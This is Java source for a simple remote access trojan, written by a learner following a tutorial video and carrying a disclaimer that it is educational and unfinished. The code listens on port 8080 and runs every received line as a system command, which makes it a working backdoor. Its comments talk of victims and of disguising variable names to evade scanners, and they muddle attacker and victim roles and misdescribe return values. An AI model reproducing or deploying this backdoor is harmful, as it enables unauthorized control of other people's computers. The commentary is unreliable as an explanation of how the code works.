// This RAT was written thanks to a basic introduction video by Dr Mahmoud ??? .All credit to him for providing the basic blueprint and sharing with learners.
//  DISCLAIMER: PLEASE NOTE THAT THIS PROGRAMME IS NOT FINISHED, IT WILL NOT RUN AS IT IS ONLY BASED ON A SHORT EXCERPT FORM A LEARNING VIDEO - ITS PURPOSE IS SIMPLY TO DOCUMENT THE STAGES OF THE PROGRAMMING AS PER THE INSTRUCTIONAL VIDEO FOLLOWED.
//DO NOT USE THIS PROGRAMME FOR ANYTHING OTHER THAN EDUCATIONAL PURPOSES. NO LIABILITY CAN BE CLAIMED FOR USE OR DEVELOPMENT OF THIS PROGRAMME BEYOND ITS INTENDED PURELY EDUCATIONAL PURPOSES.
package Frisbee;
//////////IMPORTS\\\\\\\\\\

import java.util.Scanner;
// import all net package classes/namespaces
import java.net.*;
//import all io
import java.io.*;
//////////COMPILATION\\\\\\\\\\
// Main class
public class Main {
    // declare global-scope static vars for generic system-releated functions like instantiating a buffer reader, scanning in reader etc
    private static Socket santa;
    private static Scanner darkly;
    private static PrintWriter journo;
    private static int len; //length - not clear for hat use this was included in global vars
    private static ProcessBuilder cesspool;
    private static BufferedReader buffy;
    private static String lyin; //line pseudo
    private static String steady; //stdout pseudo
    // frisbee class which defines the frisbee process.
    // there is obvious use of monikers as a basic way of obfuscating the roles of the RAT as it is being deployed. Not much of a mitigation strategy against malware scanners but a basic effort.
    // Arg1 is a string which is nicknamed backAgain... this is actually the string of the output of the commands that are being injected onto the victim's computer via the RAT pipeline.
    public static void frisbee(String backAgain) throws IOException, InterruptedException{
        //thereN is a nickname for the string variable created on the attacker computer's side which is there to recieve the backAgain string output as it is pipelined from the victim's terminal over to our string thereN.
        String thereN  = backAgain;
        // getRuntime returns the runtime exect object being created via execution (below in the main method is where runtime starts).
        //In this case we read the output of the frisbee object (in particular the inputstring arg1 backAgain which is actually whatever the victim's terminal is outputting)
        Process proc = Runtime.getRuntime().exec(thereN);
        //instantiate an instance of the bufferedReader that wraps around the getInputStream method. The getInputStream() method basically acts as a 'catcher' of any data that is flowing out. In this case, this is being targetted at port8080-directed commands on the victim's computer as clarified in below classes.
        // Meanwhile, the wrapper bufferedReader method takes every byte (in this case bytes because we use the inputstream meth) and makes a request to read each of them whole and places them in a holding buffer to be "flushed out" of main memory at the right time. This method allows less loss of data, and makes it more feasible to get the data in meaningful segments, rather than piecemeal a few bytes at a time. But note that this approach will use up the victim's as more data is read to the buffer so increasing opportunites for detection based on RAM usage?
        BufferedReader buffy = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        // here we instantiate an instance of the string that is to be filled by this bufferedReader - with the nickname of lineOut
        lyin = "";
        // while lyin the line being read into by buffy the bufferedReader instance is not null
            while ((lyin = buffy.readLine()) !=null){
                //print me that line being read plus a new line break
                System.out.print(lyin + "\n");
            }
            //once completed with printing out each of these lines, proc (which is the instance of the getRuntime method) wait for the thread to be complete
            proc.waitFor();
    }
    // another class here in compilation. This one is the targetting class. creating a smiles private method that takes the victim's host computer
    private static String smiles(String bnb){
        //instantiate an inetaddress object without definition passed arg1 which is the victim's hostname???
        InetAddress ipMan;
        // while the smiles private method is true
        while(true){
            try {
                //try block defines the previously instantiated ipman inetaddress object. In this case we are saying, use the getByName method that is one of the methods held by the InetAddress object class. We pass it arg1 of bnb, which is the victim's host name
                ipMan = InetAddress.getByName(bnb);
                //now we, in a circular manner, update this selfsame bnb variable. But whereas it previously only held the hostname of the targetted host, now it will absorb the ip address that was fetched and held into ipman place holder. We use the same InetAdress object class's getHostAddress method to do this, but also concatanate a toString meth to it because we want it as unicode characters, not hex/bytes
                bnb = ipMan.getHostAddress().toString();
                // return the updated bnb ip address to main memory for our use.
                return bnb;
            }
            catch(Exception exc) {
                //catch a failure?? in this case he wrote a continue statement as in, break the waiting loop if we don't get an ip address to associate victim host
                continue;
            }
        }
    }
    // frenchie is a pseudonym for connection , in this static meth, we specify the victim computer's connection ip (ipman) and port (starBoard)
    private static int frenchie(String ipMan, int starBoard){
        try{
            // santa is a pseudonymous nickname for an instance of a socket, which we are defining here (declared previously as global var since it will be used by other functions)
            santa = new Socket(ipMan, starBoard);
            // not clear why he has written return 1 here... traditionally return 1 means some error or ongoing process
            return 1;
        }
        catch (Exception exc){
            // if socket fails to create a stream connect at the arg1 ip address, arg2 port, then return a 0
            return 0;
            //here this should be return 1 since it would be the failure outcome but he has written it as return 0 in his construct
        }
    }
    // declare a second socket instance (pseudo rudolf)
    public static Socket rudolf;
    //////////RUNTIME\\\\\\\\\\
    //main method
    public static void main(String[] args) throws IOException, InterruptedException{
        // port assigned
        int starBoard = 8080;
        // string declared that will contain the victim's output
        String gotham;
        // string declared that will first engage victim computer's instructions
        String bonjour;
        // string declared that will contain the attacker's execution directives
        String bonsoir;
        // server socket nicknamed waiter set up listening on port 8080
        ServerSocket waiter = new ServerSocket(starBoard);
        // print out confirmation
        System.out.println("Your food is ready at"+starBoard+"o'clock.");

        // so long as we have an open connect...
        while(true){
            // victim socket makes a handshake with server socket (waiter)
            rudolf = waiter.accept();
            // stream of data fetched from victim socket
            InputStream river = rudolf.getInputStream();
            // take raw data stream and 'irrigate' it into an instance of Java bystream reader which converts bytestream into default character set of our OS (usually utf-8)
            InputStreamReader irrigate =  new InputStreamReader(river);
            //use the buffy instance of the buffered reader class to read to main memory the stream of default char data but with a buffer the flushes out (to avoid data loss and make it human-readable)
            BufferedReader buffy = new BufferedReader(irrigate);
            // line by line out for use to see victim's actions
            gotham = buffy.readLine();
            System.out.println("A new dish was served:" + gotham);
            // if we detected a quit order in the stream of data, we quit also, otherwise we keep pumping.
                if("QUIT".equals(gotham))
                    break;
                else{
                    frisbee(gotham);
                }
        }

    }
}
